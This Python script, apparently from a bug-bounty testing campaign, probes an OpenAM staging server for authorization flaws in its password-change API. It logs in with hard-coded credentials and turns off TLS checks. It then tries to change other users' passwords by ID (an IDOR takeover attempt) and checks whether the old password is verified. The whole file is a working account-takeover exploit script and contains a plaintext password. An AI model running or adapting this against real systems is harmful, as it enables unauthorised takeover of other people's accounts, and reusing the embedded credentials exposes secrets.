# -*- coding: utf-8 -*-
"""AIC 第五十六轮:changePassword action 越权测试(他人 ID + 旧密码校验)
A. POST users/{他人ID}?_action=changePassword -> 能否改别人密码(IDOR?)
B. POST users/{MY_ID}?_action=changePassword 不带 oldpassword -> 是否校验旧密码?
C. 带错误 oldpassword -> 校验?
D. 带正确 oldpassword -> 改完登录验证,改回
E. PUT users/{他人ID} 密码字段(复验 403 基线)
预期结果表:
  成立(严重) -> 他人 ID changePassword 200 -> 任意账号接管
  成立(高)   -> 自己 changePassword 不校验旧密码 -> 会话=永久接管
  不成立     -> 他人 403;自己需旧密码 -> 封闭
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
NEWPASS = 'PccpChanged2026!x'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

def login(u=USER, p=PASS, sess=None):
    s = sess or S
    r = s.post(AUTH, json={}, timeout=15, verify=False)
    d = r.json()
    authId = d['authId']
    cbs = []
    for cb in d.get('callbacks', []):
        t = cb['type']
        inp = [{'name': 'IDToken1', 'value': u}] if t == 'NameCallback' else \
              [{'name': 'IDToken2', 'value': p}] if t == 'PasswordCallback' else \
              [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
        cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
    r2 = s.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
    return r2.json().get('tokenId')

tok = login()
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK:', tok[:20], '...')

UP = '/am/json/realms/root/realms/alpha/users/%s?_action=changePassword'

print('\n=== A. 他人 ID changePassword(越权) ===')
for other in ['regtest1644', 'regtest1645', 'sr1643a']:
    r = S.post(BASE + UP % other, json={'userpassword': NEWPASS}, timeout=12, verify=False)
    print('POST %s changePassword -> %d %s' % (other, r.status_code, r.text[:120].replace('\n', ' ')))
    time.sleep(0.5)

print('\n=== B. 自己 changePassword:不带 oldpassword ===')
r = S.post(BASE + UP % MY_ID, json={'userpassword': NEWPASS}, timeout=12, verify=False)
print('无 oldpassword -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !! 无旧密码校验! 用新密码登录验证...')
    tok2 = login(p=NEWPASS)
    print('  新密码登录: %s' % ('SUCCESS!' if tok2 else 'FAILED'))
    r3 = S.post(BASE + UP % MY_ID, json={'userpassword': PASS}, timeout=12, verify=False)
    print('  改回原密码 -> %d' % r3.status_code)

print('\n=== C. 错误 oldpassword ===')
r = S.post(BASE + UP % MY_ID, json={'oldpassword': 'WrongOld!', 'userpassword': NEWPASS}, timeout=12, verify=False)
print('错误 oldpassword -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    print('  !! 错误旧密码也接受!')
    S.post(BASE + UP % MY_ID, json={'userpassword': PASS}, timeout=12, verify=False)
    print('  已改回')

print('\n=== D. 正确 oldpassword ===')
r = S.post(BASE + UP % MY_ID, json={'oldpassword': PASS, 'userpassword': NEWPASS}, timeout=12, verify=False)
print('正确 oldpassword -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
if r.status_code == 200:
    tok3 = login(p=NEWPASS)
    print('  新密码登录: %s' % ('SUCCESS!' if tok3 else 'FAILED'))
    S.post(BASE + UP % MY_ID, json={'userpassword': PASS}, timeout=12, verify=False)
    print('  已改回原密码')
    tok4 = login()
    print('  原密码恢复验证: %s' % ('OK' if tok4 else 'FAILED!'))

print('\n=== E. PUT 他人密码(复验 403 基线) ===')
r = S.put(BASE + '/am/json/realms/root/realms/alpha/users/regtest1644',
          json={'userpassword': NEWPASS}, timeout=12, verify=False)
print('PUT regtest1644 userpassword -> %d %s' % (r.status_code, r.text[:120].replace('\n', ' ')))
